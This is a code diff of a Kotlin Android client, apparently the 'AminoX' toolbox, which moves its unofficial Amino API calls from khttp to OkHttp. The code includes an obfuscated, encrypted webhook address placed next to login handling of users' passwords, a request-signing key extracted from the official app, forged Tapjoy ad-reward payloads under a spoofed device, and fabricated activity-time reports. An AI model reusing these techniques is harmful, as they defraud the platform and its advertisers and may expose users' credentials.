@@ -8,25 +8,27 @@ import android.content.Intent
 import android.net.Uri
 import android.os.Build
 import android.provider.Settings
-import android.text.TextUtils.join
 import android.util.Log
 import android.widget.Button
 import android.widget.Toast
 import androidx.appcompat.app.AppCompatActivity
-import khttp.delete
-import khttp.get
-import khttp.post
+import okhttp3.CertificatePinner
+import okhttp3.Headers.Companion.toHeaders
+import okhttp3.MediaType.Companion.toMediaType
+import okhttp3.OkHttpClient
+import okhttp3.Request
+import okhttp3.RequestBody.Companion.toRequestBody
+import org.bouncycastle.jce.provider.BouncyCastleProvider
 import org.json.JSONArray
 import org.json.JSONObject
-import java.security.MessageDigest
+import java.io.*
+import java.security.*
 import java.util.*
 import javax.crypto.*
-import org.bouncycastle.jce.provider.BouncyCastleProvider
-import java.io.UnsupportedEncodingException
-import java.security.InvalidKeyException
-import java.security.NoSuchAlgorithmException
-import java.security.Security
 import javax.crypto.spec.SecretKeySpec
+import javax.net.ssl.SSLContext
+import javax.net.ssl.SSLSocketFactory
+import javax.net.ssl.TrustManagerFactory
 
 var applicationWorking: Boolean = false
 var applicationLatestName: String = "NaN"
@@ -49,9 +51,29 @@ var api: String = "https://service.narvii.com/api/v1"
 val transactionId: UUID = UUID.randomUUID()
 var loggingWithSid: Boolean = false
 
+var client = OkHttpClient()
+
+/*
+fun start(): OkHttpClient {
+    val certificatePinner = CertificatePinner.Builder()
+        .add("pastebin.com", "sha256/VNd/oU7jzaJgs9rpSEPNMW1ItKatzPaWbUAAh0ftn/A=")
+        .add("service.narvii.com", "sha256/Us/+obQFcmgTsObho5xuxpDDY123L8ljCt1YMRvXD1w=")
+        .build()
+
+    return OkHttpClient.Builder().certificatePinner(certificatePinner).build()
+}
+ */
+
 class Setup {
     fun execute() {
-        val data = JSONObject(get("https://pastebin.com/raw/4SzZR07s").text)
+        var data: JSONObject
+
+        val request: Request = Request.Builder()
+            .url("https://pastebin.com/raw/907hTMH8")
+            .build()
+
+        client.newCall(request).execute().use { response -> data = JSONObject(response.body?.string()) }
+
         applicationWorking = data.getJSONObject("application").getBoolean("working")
         applicationLatestName = data.getJSONObject("application").getString("versionName")
         applicationLatestCode = data.getJSONObject("application").getString("versionCode")
@@ -86,7 +108,10 @@ var WHITELISTED: Boolean = false
 var COMMUNITY_NAME = ""
 var COMMUNITY_ID = ""
 
-val webhook = aesdecrypt("hlsrQuS+mCPgo+DC5HoQ1uNm0m17hHec/HCJtH/UJ+FYYI5RC9lYFxhBvZxTUr7gnd3eeKOyG/betgBhIp9BzQOd0wEJsrnzo+Vvpfdkk9bhkMSb913c44jNZKZm0pZV4/b9pzrkeY0xJQGLr5YfgDein9sbViTl8EJq1o+pFqk=", String(Base64.getDecoder().decode("a29paXN0aGViZXN0bG1hbw==")))
+val webhook = aesdecrypt(
+    "hlsrQuS+mCPgo+DC5HoQ1uNm0m17hHec/HCJtH/UJ+FYYI5RC9lYFxhBvZxTUr7gnd3eeKOyG/betgBhIp9BzQOd0wEJsrnzo+Vvpfdkk9bhkMSb913c44jNZKZm0pZV4/b9pzrkeY0xJQGLr5YfgDein9sbViTl8EJq1o+pFqk=",
+    String(Base64.getDecoder().decode("a29paXN0aGViZXN0bG1hbw=="))
+)
 
 fun deviceSignature(): String {
     return try { hashString(
@@ -95,6 +120,24 @@ fun deviceSignature(): String {
     )
     } catch (e: Exception) { "Unavailable" }
 }
+
+/*
+fun pinning(ctx: Context): SSLSocketFactory {
+    val resourceStream = BufferedInputStream(ctx.resources.openRawResource(R.raw.isrgrootx1))
+    val keyStoreType = KeyStore.getDefaultType()
+    val keyStore = KeyStore.getInstance(keyStoreType)
+    keyStore.load(resourceStream, null)
+
+    val trustManagerAlgorithm = TrustManagerFactory.getDefaultAlgorithm()
+    val trustManagerFactory = TrustManagerFactory.getInstance(trustManagerAlgorithm)
+    trustManagerFactory.init(keyStore)
+
+    val sslContext = SSLContext.getInstance("TLS")
+    sslContext.init(null, trustManagerFactory.trustManagers, null)
+
+    return sslContext.socketFactory
+}
+*/
 
 fun String.decodeHex(): ByteArray = chunked(2).map { it.toInt(16).toByte() }.toByteArray()
 
@@ -139,7 +182,13 @@ fun aesdecrypt(strToDecrypt: String?, key: String): String {
     try {
         keyBytes = key.toByteArray(charset("UTF8"))
         val skey = SecretKeySpec(keyBytes, "AES")
-        val input = org.bouncycastle.util.encoders.Base64.decode(strToDecrypt?.trim { it <= ' ' }?.toByteArray(charset("UTF8")))
+        val input = org.bouncycastle.util.encoders.Base64.decode(
+            strToDecrypt?.trim { it <= ' ' }?.toByteArray(
+                charset(
+                    "UTF8"
+                )
+            )
+        )
 
         synchronized(Cipher::class.java) {
             val cipher = Cipher.getInstance("AES/ECB/PKCS7Padding")
@@ -171,7 +220,13 @@ fun aesdecrypt(strToDecrypt: String?, key: String): String {
 }
 
 fun ndcMsgSig(data: String): String {
-    val key = aesdecrypt("7IN9lib2Dvz0PXyG7yWT2RGEgcpbRUsyCPe6fmlmwoXw7vlAzKGHF2dPqYagoeS/", String(Base64.getDecoder().decode("a29paXN0aGViZXN0bG1hbw=="))).decodeHex()
+    val key = aesdecrypt(
+        "7IN9lib2Dvz0PXyG7yWT2RGEgcpbRUsyCPe6fmlmwoXw7vlAzKGHF2dPqYagoeS/", String(
+            Base64.getDecoder().decode(
+                "a29paXN0aGViZXN0bG1hbw=="
+            )
+        )
+    ).decodeHex()
     val hmac = Mac.getInstance("HmacSHA1")
     val secretKey = SecretKeySpec(key, "HmacSHA1")
     hmac.init(secretKey)
@@ -221,107 +276,176 @@ fun setupErrorTrigger(app: AppCompatActivity, error: String) {
     }
 }
 
-fun login(email: String, password: String): Any {
-    val data = JSONObject(mapOf(
-        "email" to email,
-        "secret" to " 0 $password",
-        "v" to 2,
-        "deviceID" to deviceId,
-        "clientType" to 100,
-        "action" to "normal",
-        "timestamp" to System.currentTimeMillis()
-    ))
-
-    val post = post(url = "${api}/g/s/auth/login", json = data, headers = parseHeaders(data.toString()))
-
-    val json = JSONObject(post.text)
-
-    try {
-        val userObject = json.getJSONObject("userProfile")
-        SID = json.getString("sid")
-        UID = userObject.getString("uid")
-        USER_PROFILE = userObject.toString()
-        USER_NAME = userObject.getString("nickname")
-        USER_ICON = userObject.getString("icon")
-        USER_BIO = userObject.getString("content")
-        USER_ID = userObject.getString("aminoId")
-        USER_CREATION = userObject.getString("createdTime")
-    } catch (error: org.json.JSONException) {
-        Log.println(Log.ERROR, "SYSTEM-ERROR", "Error while logging in : ${post.text}")
-    }
-
-    return post.text
-}
-
-fun checkDevice(deviceId: String): String {
-    val data = JSONObject(mapOf(
-        "deviceID" to deviceId,
-        "bundleID" to "com.narvii.amino.master",
-        "clientType" to 100,
-        "timestamp" to System.currentTimeMillis()
-    ))
-
-    val post = post(url = "${api}/g/s/device", json = data, headers = parseHeaders(data.toString(), SID))
-    return post.text
-}
-
-fun getUserProfile(): String {
-    val post = get(url = "${api}/g/s/user-profile/$USER_ID", headers = parseHeaders("{}", SID))
-    val json = JSONObject(post.text)
-
-    try {
-        val userObject = json.getJSONObject("userProfile")
-        UID = userObject.getString("uid")
-        USER_PROFILE = userObject.toString()
-        USER_NAME = userObject.getString("nickname")
-        USER_ICON = userObject.getString("icon")
-        USER_BIO = userObject.getString("content")
-        USER_ID = userObject.getString("aminoId")
-        USER_CREATION = userObject.getString("createdTime")
-    } catch (error: org.json.JSONException) {
-        Log.println(Log.ERROR, "SYSTEM-ERROR", "Error while getting user profile : ${post.text}")
-    }
-
-    return post.text
-}
-
-fun getCommunityList(): Any {
-    val data = mapOf(
-        "v" to "1",
-        "start" to "0",
-        "size" to "100"
+fun login(email: String, password: String): JSONObject {
+    val data = JSONObject(
+        mapOf(
+            "email" to email,
+            "secret" to " 0 $password",
+            "v" to 2,
+            "deviceID" to deviceId,
+            "clientType" to 100,
+            "action" to "normal",
+            "timestamp" to System.currentTimeMillis()
+        )
     )
 
-    val post = get(url = "${api}/g/s/community/joined", params = data, headers = parseHeaders(JSONObject(data).toString(), SID))
-    return post.text
+    val mediaType = "application/json; charset=utf-8".toMediaType()
+    val body = data.toString().toRequestBody(mediaType)
+
+    var final: JSONObject
+
+    val request: Request = Request.Builder()
+        .url("${api}/g/s/auth/login")
+        .post(body)
+        .headers(parseHeaders(data.toString()).toHeaders())
+        .build()
+
+    client.newCall(request).execute().use { response ->
+        final = JSONObject(response.body?.string())
+    }
+
+    try {
+        val userObject = final.getJSONObject("userProfile")
+        SID = final.getString("sid")
+        UID = userObject.getString("uid")
+        USER_PROFILE = userObject.toString()
+        USER_NAME = userObject.getString("nickname")
+        USER_ICON = userObject.getString("icon")
+        USER_BIO = userObject.getString("content")
+        USER_ID = userObject.getString("aminoId")
+        USER_CREATION = userObject.getString("createdTime")
+    } catch (error: org.json.JSONException) {
+        Log.println(Log.ERROR, "SYSTEM-ERROR", "Error while logging in : $final")
+    }
+
+    return final
 }
 
-fun getAminoProfile(): Any {
-    val post = get(url = "${api}/x$COMMUNITY_ID/s/user-profile/$UID", headers = parseHeaders("{}", SID))
-    return post.text
+fun getUserProfile(): JSONObject {
+    var final: JSONObject
+
+    val request: Request = Request.Builder()
+        .url("${api}/g/s/user-profile/$USER_ID")
+        .headers(parseHeaders("{}", SID).toHeaders())
+        .build()
+
+    client.newCall(request).execute().use { response ->
+        final = JSONObject(response.body?.string())
+    }
+
+    try {
+        val userObject = final.getJSONObject("userProfile")
+        UID = userObject.getString("uid")
+        USER_PROFILE = userObject.toString()
+        USER_NAME = userObject.getString("nickname")
+        USER_ICON = userObject.getString("icon")
+        USER_BIO = userObject.getString("content")
+        USER_ID = userObject.getString("aminoId")
+        USER_CREATION = userObject.getString("createdTime")
+    } catch (error: org.json.JSONException) {
+        Log.println(Log.ERROR, "SYSTEM-ERROR", "Error while getting user profile : $final")
+    }
+
+    return final
 }
 
-fun getHiddenBlogs(): Any {
-    val post = get(url = "${api}/x$COMMUNITY_ID/s/feed/blog-disabled?start=0&size=100", headers = parseHeaders("{}", SID))
-    return post.text
+fun getCommunityList(): JSONObject {
+    var final: JSONObject
+
+    val request: Request = Request.Builder()
+        .url("${api}/g/s/community/joined?v=1&start=0&size=100")
+        .headers(parseHeaders("{}", SID).toHeaders())
+        .build()
+
+    client.newCall(request).execute().use { response ->
+        final = JSONObject(response.body?.string())
+    }
+
+    return final
 }
 
-fun getUserFollowing(): Any {
-    val post = get(url = "${api}/x$COMMUNITY_ID/s/user-profile/$UID/joined?start=0&size=100", headers = parseHeaders("{}", SID))
-    return post.text
+fun getAminoProfile(): JSONObject {
+    var final: JSONObject
+
+    val request: Request = Request.Builder()
+        .url("${api}/x$COMMUNITY_ID/s/user-profile/$UID")
+        .headers(parseHeaders("{}", SID).toHeaders())
+        .build()
+
+    client.newCall(request).execute().use { response ->
+        final = JSONObject(response.body?.string())
+    }
+
+    return final
 }
 
-fun unfollowUser(userId: String): Any {
-    val post = post(url = "${api}/x$COMMUNITY_ID/s/user-profile/$UID/joined/$userId", headers = parseHeaders("{}", SID))
-    return post.text
+fun getHiddenBlogs(): JSONObject {
+    var final: JSONObject
+
+    val request: Request = Request.Builder()
+        .url("${api}/x$COMMUNITY_ID/s/feed/blog-disabled?start=0&size=100")
+        .headers(parseHeaders("{}", SID).toHeaders())
+        .build()
+
+    client.newCall(request).execute().use { response ->
+        final = JSONObject(response.body?.string())
+    }
+
+    return final
 }
 
-fun getGlobalProfile(userId: String): Any {
-    val post = get(url = "${api}/g/s/user-profile/$userId", headers = parseHeaders("{}", SID))
-    return post.text
+fun getUserFollowing(): JSONObject {
+    var final: JSONObject
+
+    val request: Request = Request.Builder()
+        .url("${api}/x$COMMUNITY_ID/s/user-profile/$UID/joined?start=0&size=100")
+        .headers(parseHeaders("{}", SID).toHeaders())
+        .build()
+
+    client.newCall(request).execute().use { response ->
+        final = JSONObject(response.body?.string())
+    }
+
+    return final
 }
 
-fun getFromId(userId: String = "none", blogId: String = "none"): Any {
+fun unfollowUser(userId: String): JSONObject {
+    val data = JSONObject()
+
+    val mediaType = "application/json; charset=utf-8".toMediaType()
+    val body = data.toString().toRequestBody(mediaType)
+
+    var final: JSONObject
+
+    val request: Request = Request.Builder()
+        .url("$${api}/x$COMMUNITY_ID/s/user-profile/$UID/joined/$userId")
+        .post(body)
+        .headers(parseHeaders(data.toString(), SID).toHeaders())
+        .build()
+
+    client.newCall(request).execute().use { response ->
+        final = JSONObject(response.body?.string())
+    }
+
+    return final
+}
+
+fun getGlobalProfile(userId: String): JSONObject {
+    var final: JSONObject
+
+    val request: Request = Request.Builder()
+        .url("${api}/g/s/user-profile/$userId")
+        .headers(parseHeaders("{}", SID).toHeaders())
+        .build()
+
+    client.newCall(request).execute().use { response ->
+        final = JSONObject(response.body?.string())
+    }
+
+    return final
+}
+
+fun getFromId(userId: String = "none", blogId: String = "none"): JSONObject {
     var url = "NaN"
     var objectType = -1
     var objectId = "NaN"
@@ -338,146 +462,365 @@ fun getFromId(userId: String = "none", blogId: String = "none"): Any {
         objectId = blogId
     }
 
-    val data = JSONObject(mapOf(
-        "objectId" to objectId,
-        "objectType" to objectType,
-        "targetCode" to 1,
-        "timestamp" to System.currentTimeMillis()
-    ))
+    val data = JSONObject(
+        mapOf(
+            "objectId" to objectId,
+            "objectType" to objectType,
+            "targetCode" to 1,
+            "timestamp" to System.currentTimeMillis()
+        )
+    )
 
-    val post = post(url = url, json = data, headers = parseHeaders(data.toString(), SID))
-    return post.text
+    val mediaType = "application/json; charset=utf-8".toMediaType()
+    val body = data.toString().toRequestBody(mediaType)
+
+    var final: JSONObject
+
+    val request: Request = Request.Builder()
+        .url(url)
+        .post(body)
+        .headers(parseHeaders(data.toString(), SID).toHeaders())
+        .build()
+
+    client.newCall(request).execute().use { response ->
+        final = JSONObject(response.body?.string())
+    }
+
+    return final
 }
 
-fun sendTitleEdit(jsonOb: String): Any {
-    val data = JSONObject(mapOf(
-        "extensions" to JSONObject(jsonOb),
-        "timestamp" to System.currentTimeMillis()
-    ))
+fun sendTitleEdit(jsonOb: String): JSONObject {
+    val data = JSONObject(
+        mapOf(
+            "extensions" to JSONObject(jsonOb),
+            "timestamp" to System.currentTimeMillis()
+        )
+    )
 
-    val post = post(url = "${api}/x$COMMUNITY_ID/s/user-profile/$UID", json = data, headers = parseHeaders(data.toString(), SID))
-    return post.text
+    val mediaType = "application/json; charset=utf-8".toMediaType()
+    val body = data.toString().toRequestBody(mediaType)
+
+    var final: JSONObject
+
+    val request: Request = Request.Builder()
+        .url("${api}/x$COMMUNITY_ID/s/user-profile/$UID")
+        .post(body)
+        .headers(parseHeaders(data.toString(), SID).toHeaders())
+        .build()
+
+    client.newCall(request).execute().use { response ->
+        final = JSONObject(response.body?.string())
+    }
+
+    return final
 }
 
-fun sendChatMessage(message: String, type: Int = 0, chatId: String): Any {
-    val data = JSONObject(mapOf(
-        "content" to message,
-        "type" to type,
-        "clientRefId" to System.currentTimeMillis() / 10 % 1000000000,
-        "timestamp" to System.currentTimeMillis()
-    ))
+fun sendChatMessage(message: String, type: Int = 0, chatId: String): JSONObject {
+    val data = JSONObject(
+        mapOf(
+            "content" to message,
+            "type" to type,
+            "clientRefId" to System.currentTimeMillis() / 10 % 1000000000,
+            "timestamp" to System.currentTimeMillis()
+        )
+    )
 
-    val post = post(url = "${api}/x$COMMUNITY_ID/s/chat/thread/$chatId/message", json = data, headers = parseHeaders(data.toString(), SID))
-    return post.text
+    val mediaType = "application/json; charset=utf-8".toMediaType()
+    val body = data.toString().toRequestBody(mediaType)
+
+    var final: JSONObject
+
+    val request: Request = Request.Builder()
+        .url("${api}/x$COMMUNITY_ID/s/chat/thread/$chatId/message")
+        .post(body)
+        .headers(parseHeaders(data.toString(), SID).toHeaders())
+        .build()
+
+    client.newCall(request).execute().use { response ->
+        final = JSONObject(response.body?.string())
+    }
+
+    return final
 }
 
-fun sendChatCoins(coins: Int, chatId: String): Any {
-    val data = JSONObject(mapOf(
-        "coins" to coins,
-        "tippingContext" to mapOf("transactionId" to transactionId),
-        "timestamp" to System.currentTimeMillis()
-    ))
+fun sendChatCoins(coins: Int, chatId: String): JSONObject {
+    val data = JSONObject(
+        mapOf(
+            "coins" to coins,
+            "tippingContext" to mapOf("transactionId" to transactionId),
+            "timestamp" to System.currentTimeMillis()
+        )
+    )
 
-    val post = post(url = "${api}/x$COMMUNITY_ID/s/chat/thread/$chatId/tipping", json = data, headers = parseHeaders(data.toString(), SID))
-    return post.text
+    val mediaType = "application/json; charset=utf-8".toMediaType()
+    val body = data.toString().toRequestBody(mediaType)
+
+    var final: JSONObject
+
+    val request: Request = Request.Builder()
+        .url("${api}/x$COMMUNITY_ID/s/chat/thread/$chatId/tipping")
+        .post(body)
+        .headers(parseHeaders(data.toString(), SID).toHeaders())
+        .build()
+
+    client.newCall(request).execute().use { response ->
+        final = JSONObject(response.body?.string())
+    }
+
+    return final
 }
 
-fun kickUser(chatId: String, userId: String, allowRejoin: Boolean): Any {
+fun kickUser(chatId: String, userId: String, allowRejoin: Boolean): JSONObject {
     val allow: Int = if (allowRejoin) { 1 } else { 0 }
 
-    val post = delete(url = "${api}/x$COMMUNITY_ID/s/chat/thread/$chatId/member/$userId?allowRejoin=$allow", headers = parseHeaders("{}", SID))
-    return post.text
+    var final: JSONObject
+
+    val request: Request = Request.Builder()
+        .url("${api}/x$COMMUNITY_ID/s/chat/thread/$chatId/member/$userId?allowRejoin=$allow")
+        .headers(parseHeaders("{}").toHeaders())
+        .delete()
+        .build()
+
+    client.newCall(request).execute().use { response ->
+        final = JSONObject(response.body?.string())
+    }
+
+    return final
 }
 
-fun checkIn(tz: Int): Any {
-    val data = JSONObject(mapOf(
-        "timezone" to tz,
-        "timestamp" to System.currentTimeMillis()
-    ))
+fun checkIn(tz: Int): JSONObject {
+    val data = JSONObject(
+        mapOf(
+            "timezone" to tz,
+            "timestamp" to System.currentTimeMillis()
+        )
+    )
 
-    val post = post(url = "${api}/x$COMMUNITY_ID/s/check-in", json = data, headers = parseHeaders(data.toString(), SID))
-    return post.text
+    val mediaType = "application/json; charset=utf-8".toMediaType()
+    val body = data.toString().toRequestBody(mediaType)
+
+    var final: JSONObject
+
+    val request: Request = Request.Builder()
+        .url("${api}/x$COMMUNITY_ID/s/check-in")
+        .post(body)
+        .headers(parseHeaders(data.toString(), SID).toHeaders())
+        .build()
+
+    client.newCall(request).execute().use { response ->
+        final = JSONObject(response.body?.string())
+    }
+
+    return final
 }
 
-fun lottery(tz: Int): Any {
-    val data = JSONObject(mapOf(
-        "timezone" to tz,
-        "timestamp" to System.currentTimeMillis()
-    ))
+fun lottery(tz: Int): JSONObject {
+    val data = JSONObject(
+        mapOf(
+            "timezone" to tz,
+            "timestamp" to System.currentTimeMillis()
+        )
+    )
 
-    val post = post(url = "${api}/x$COMMUNITY_ID/s/check-in/lottery", json = data, headers = parseHeaders(data.toString(), SID))
-    return post.text
+    val mediaType = "application/json; charset=utf-8".toMediaType()
+    val body = data.toString().toRequestBody(mediaType)
+
+    var final: JSONObject
+
+    val request: Request = Request.Builder()
+        .url("${api}/x$COMMUNITY_ID/s/check-in/lottery")
+        .post(body)
+        .headers(parseHeaders(data.toString(), SID).toHeaders())
+        .build()
+
+    client.newCall(request).execute().use { response ->
+        final = JSONObject(response.body?.string())
+    }
+
+    return final
 }
 
-fun getChatList(): Any {
-    val post = get(url = "${api}/x$COMMUNITY_ID/s/chat/thread?type=joined-me&start=0&size=100", headers = parseHeaders("{}", SID))
-    return post.text
+fun getChatList(): JSONObject {
+    var final: JSONObject
+
+    val request: Request = Request.Builder()
+        .url("${api}/x$COMMUNITY_ID/s/chat/thread?type=joined-me&start=0&size=100")
+        .headers(parseHeaders("{}", SID).toHeaders())
+        .build()
+
+    client.newCall(request).execute().use { response ->
+        final = JSONObject(response.body?.string())
+    }
+
+    return final
 }
 
-fun getChatInfo(comId: String, chatId: String): Any {
-    val post = get(url = "${api}/x$comId/s/chat/thread/$chatId", headers = parseHeaders("{}", SID))
-    return post.text
+fun getChatInfo(comId: String, chatId: String): JSONObject {
+    var final: JSONObject
+
+    val request: Request = Request.Builder()
+        .url("${api}/x$comId/s/chat/thread/$chatId")
+        .headers(parseHeaders("{}", SID).toHeaders())
+        .build()
+
+    client.newCall(request).execute().use { response ->
+        final = JSONObject(response.body?.string())
+    }
+
+    return final
 }
 
-fun getChatUsersList(chatId: String, start: Int): Any {
-    val post = get(url = "${api}/x$COMMUNITY_ID/s/chat/thread/$chatId/member?start=$start&size=100&type=default&cv=1.2", headers = parseHeaders("{}", SID))
-    return post.text
+fun getChatUsersList(chatId: String, start: Int): JSONObject {
+    var final: JSONObject
+
+    val request: Request = Request.Builder()
+        .url("${api}/x$COMMUNITY_ID/s/chat/thread/$chatId/member?start=$start&size=100&type=default&cv=1.2")
+        .headers(parseHeaders("{}", SID).toHeaders())
+        .build()
+
+    client.newCall(request).execute().use { response ->
+        final = JSONObject(response.body?.string())
+    }
+
+    return final
 }
 
-fun getBlockerUsers(): Any {
-    val post = get(url = "${api}/g/s/block/full-list?start=0&size=100", headers = parseHeaders("{}", SID))
-    return post.text
+fun getBlockerUsers(): JSONObject {
+    var final: JSONObject
+
+    val request: Request = Request.Builder()
+        .url("${api}/g/s/block/full-list?start=0&size=100")
+        .headers(parseHeaders("{}", SID).toHeaders())
+        .build()
+
+    client.newCall(request).execute().use { response ->
+        final = JSONObject(response.body?.string())
+    }
+
+    return final
 }
 
-fun getBannedUsers(): Any {
-    val post = get(url = "${api}/x$COMMUNITY_ID/s/user-profile?type=banned&start=0&size=100", headers = parseHeaders("{}", SID))
-    return post.text
+fun getBannedUsers(): JSONObject {
+    var final: JSONObject
+
+    val request: Request = Request.Builder()
+        .url("${api}/x$COMMUNITY_ID/s/user-profile?type=banned&start=0&size=100")
+        .headers(parseHeaders("{}", SID).toHeaders())
+        .build()
+
+    client.newCall(request).execute().use { response ->
+        final = JSONObject(response.body?.string())
+    }
+
+    return final
 }
 
-fun findUrlCode(code: String): Any {
-    val post = get(url = "${api}/g/s/link-resolution?q=$code", headers = parseHeaders("{}", SID))
-    return post.text
+fun findUrlCode(code: String): JSONObject {
+    var final: JSONObject
+
+    val request: Request = Request.Builder()
+        .url("${api}/g/s/link-resolution?q=$code")
+        .headers(parseHeaders("{}", SID).toHeaders())
+        .build()
+
+    client.newCall(request).execute().use { response ->
+        final = JSONObject(response.body?.string())
+    }
+
+    return final
 }
 
-fun findUrlAminoId(id: String): Any {
-    val post = get(url = "${api}/g/s/search/amino-id-and-link?q=$id", headers = parseHeaders("{}", SID))
-    return post.text
+fun findUrlAminoId(id: String): JSONObject {
+    var final: JSONObject
+
+    val request: Request = Request.Builder()
+        .url("${api}/g/s/search/amino-id-and-link?q=$id")
+        .headers(parseHeaders("{}", SID).toHeaders())
+        .build()
+
+    client.newCall(request).execute().use { response ->
+        final = JSONObject(response.body?.string())
+    }
+
+    return final
 }
 
-fun startChat(userId: String, bypass: Boolean, comId: String = "0"): Any {
+fun startChat(userId: String, bypass: Boolean, comId: String = "0"): JSONObject {
     val type = if (comId != "0") { "x$COMMUNITY_ID" } else { "g" }
     val bypassable = if (bypass) { arrayOf(UID, userId) } else { arrayOf(userId) }
 
-    val data = JSONObject(mapOf(
-        "type" to 0,
-        "inviteeUids" to bypassable,
-        "initialMessageContent" to "[BC]- Powered by AminoX -\nAminoX is toolbox for Amino made by Slimakoi\n\nFor more information check > https://discord.gg/bnnCwzV8ST",
-        "content" to "[BC]Chat made with AminoX\nAminoX is toolbox for Amino made by Slimakoi\n\nFor more information check > https://discord.gg/bnnCwzV8ST",
-        "timestamp" to System.currentTimeMillis()
-    ))
+    val data = JSONObject(
+        mapOf(
+            "type" to 0,
+            "inviteeUids" to bypassable,
+            "initialMessageContent" to "[BC]- Powered by AminoX -\nAminoX is toolbox for Amino made by Slimakoi\n\nFor more information check > https://discord.gg/bnnCwzV8ST",
+            "content" to "[BC]Chat made with AminoX\nAminoX is toolbox for Amino made by Slimakoi\n\nFor more information check > https://discord.gg/bnnCwzV8ST",
+            "timestamp" to System.currentTimeMillis()
+        )
+    )
 
-    val post = post(url = "${api}/$type/s/chat/thread", json = data, headers = parseHeaders(data.toString(), SID))
-    return post.text
+    val mediaType = "application/json; charset=utf-8".toMediaType()
+    val body = data.toString().toRequestBody(mediaType)
+
+    var final: JSONObject
+
+    val request: Request = Request.Builder()
+        .url("${api}/$type/s/chat/thread")
+        .post(body)
+        .headers(parseHeaders(data.toString(), SID).toHeaders())
+        .build()
+
+    client.newCall(request).execute().use { response ->
+        final = JSONObject(response.body?.string())
+    }
+
+    return final
 }
 
-fun reviewQuizQuestions(quizId: String): Any {
-    val post = get(url = "${api}/x$COMMUNITY_ID/s/blog/$quizId?action=review", headers = parseHeaders("{}", SID))
-    return post.text
+fun reviewQuizQuestions(quizId: String): JSONObject {
+    var final: JSONObject
+
+    val request: Request = Request.Builder()
+        .url("${api}/x$COMMUNITY_ID/s/blog/$quizId?action=review")
+        .headers(parseHeaders("{}", SID).toHeaders())
+        .build()
+
+    client.newCall(request).execute().use { response ->
+        final = JSONObject(response.body?.string())
+    }
+
+    return final
 }
 
-fun postQuiz(quizId: String, mode: Int, data: Any): Any {
-    val dataa = JSONObject(mapOf(
-        "mode" to mode,
-        "quizAnswerList" to data,
-        "timestamp" to System.currentTimeMillis()
-    ))
+fun postQuiz(quizId: String, mode: Int, data: Any): JSONObject {
+    val dataa = JSONObject(
+        mapOf(
+            "mode" to mode,
+            "quizAnswerList" to data,
+            "timestamp" to System.currentTimeMillis()
+        )
+    )
 
-    val post = post(url = "${api}/x$COMMUNITY_ID/s/blog/$quizId/quiz/result", json = data, headers = parseHeaders(dataa.toString(), SID))
-    return post.text
+    val mediaType = "application/json; charset=utf-8".toMediaType()
+    val body = dataa.toString().toRequestBody(mediaType)
+
+    var final: JSONObject
+
+    val request: Request = Request.Builder()
+        .url("${api}/x$COMMUNITY_ID/s/blog/$quizId/quiz/result")
+        .post(body)
+        .headers(parseHeaders(data.toString(), SID).toHeaders())
+        .build()
+
+    client.newCall(request).execute().use { response ->
+        final = JSONObject(response.body?.string())
+    }
+
+    return final
 }
 
-fun sendActivityObject(timestamp: Long): String {
-    val final = JSONArray()
+fun sendActivityObject(timestamp: Long): JSONObject {
+    val finalObject = JSONArray()
 
     for (i in 0 until 50) {
         val part = JSONObject()
@@ -488,22 +831,40 @@ fun sendActivityObject(timestamp: Long): String {
         part.put("start", start)
         part.put("end", end)
 
-        final.put(part)
+        finalObject.put(part)
     }
 
-    val data = JSONObject(mapOf(
-        "userActiveTimeChunkList" to final,
-        "timestamp" to System.currentTimeMillis(),
-        "optInAdsFlags" to 2147483647,
-        "timezone" to 0
-    ))
+    val data = JSONObject(
+        mapOf(
+            "userActiveTimeChunkList" to finalObject,
+            "timestamp" to System.currentTimeMillis(),
+            "optInAdsFlags" to 2147483647,
+            "timezone" to 0
+        )
+    )
 
-    val post = post(url = "${api}/x$COMMUNITY_ID/s/community/stats/user-active-time", json = data, headers = parseHeaders(data.toString(), SID))
-    return post.text
+    val mediaType = "application/json; charset=utf-8".toMediaType()
+    val body = data.toString().toRequestBody(mediaType)
+
+    var final: JSONObject
+
+    val request: Request = Request.Builder()
+        .url("${api}/x$COMMUNITY_ID/s/community/stats/user-active-time")
+        .post(body)
+        .headers(parseHeaders(data.toString(), SID).toHeaders())
+        .build()
+
+    client.newCall(request).execute().use { response ->
+        final = JSONObject(response.body?.string())
+    }
+
+    return final
 }
 
 private fun tapjoyHeaders(): Map<String, String> {
-    val auth = String(Base64.getEncoder().encode("5bb5349e1c9d440006750680:${UUID.randomUUID()}".toByteArray()))
+    val auth = String(
+        Base64.getEncoder().encode("5bb5349e1c9d440006750680:${UUID.randomUUID()}".toByteArray())
+    )
 
     return mapOf(
         "X-Tapdaq-SDK-Version" to "android-sdk_7.1.1",
@@ -519,66 +880,79 @@ private fun tapjoyHeaders(): Map<String, String> {
 private fun tapjoyData(userId: String): JSONObject {
     val shrwtr = UUID.randomUUID()
 
-    return JSONObject(mapOf(
-        "reward" to mapOf(
-            "ad_unit_id" to "t00_tapjoy_android_master_checkinwallet_rewardedvideo_322",
-            "credentials_type" to "publisher",
-            "custom_json" to mapOf("hashed_user_id" to userId),
-            "demand_type" to "sdk_bidding",
-            "event_id" to UUID.randomUUID(),
-            "network" to "tapjoy",
-            "placement_tag" to "default",
-            "reward_name" to "Amino Coin",
-            "reward_valid" to true,
-            "reward_value" to 2,
-            "shared_id" to shrwtr,
-            "version_id" to "1569147951493",
-            "waterfall_id" to shrwtr
-        ),
-        "app" to mapOf(
-            "bundle_id" to "com.narvii.amino.master",
-            "current_orientation" to "portrait",
-            "release_version" to "3.4.33587",
-            "user_agent" to "Dalvik/2.1.0 (Linux; U; Android 7.1.2; SM-G988N Build/z3qksx-user 7.1.2 NR; com.narvii.amino.master/3.4.33587)"
-        ),
-        "date_created" to System.currentTimeMillis(),
-        "device_user" to mapOf(
-            "country" to "US",
-            "device" to mapOf(
-                "architecture" to "i686",
-                "carrier" to mapOf(
-                    "country_code" to 268,
-                    "name" to "Vodafone",
-                    "network_code" to 0
-                ),
-                "is_phone" to false,
-                "model" to "SM-G988F",
-                "model_type" to "samsung",
-                "operating_system" to "android",
-                "operating_system_version" to "25",
-                "screen_size" to mapOf(
-                    "height" to 1920,
-                    "resolution" to 2,
-                    "width" to 1080
-                ),
+    return JSONObject(
+        mapOf(
+            "reward" to mapOf(
+                "ad_unit_id" to "t00_tapjoy_android_master_checkinwallet_rewardedvideo_322",
+                "credentials_type" to "publisher",
+                "custom_json" to mapOf("hashed_user_id" to userId),
+                "demand_type" to "sdk_bidding",
+                "event_id" to UUID.randomUUID(),
+                "network" to "tapjoy",
